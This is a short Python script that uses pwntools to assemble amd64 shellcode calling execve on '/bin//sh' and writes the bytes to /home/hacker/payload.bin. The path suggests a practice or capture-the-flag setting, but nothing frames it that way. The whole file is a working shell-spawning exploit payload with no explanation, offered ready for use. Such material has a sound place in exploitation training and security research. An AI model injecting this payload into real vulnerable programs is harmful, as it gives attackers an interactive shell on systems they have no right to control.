from pwn import asm, context

context.arch = "amd64"
payload = asm("""
    xor rdx, rdx
    push rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov eax, 59
    syscall
""")
open("/home/hacker/payload.bin", "wb").write(payload)
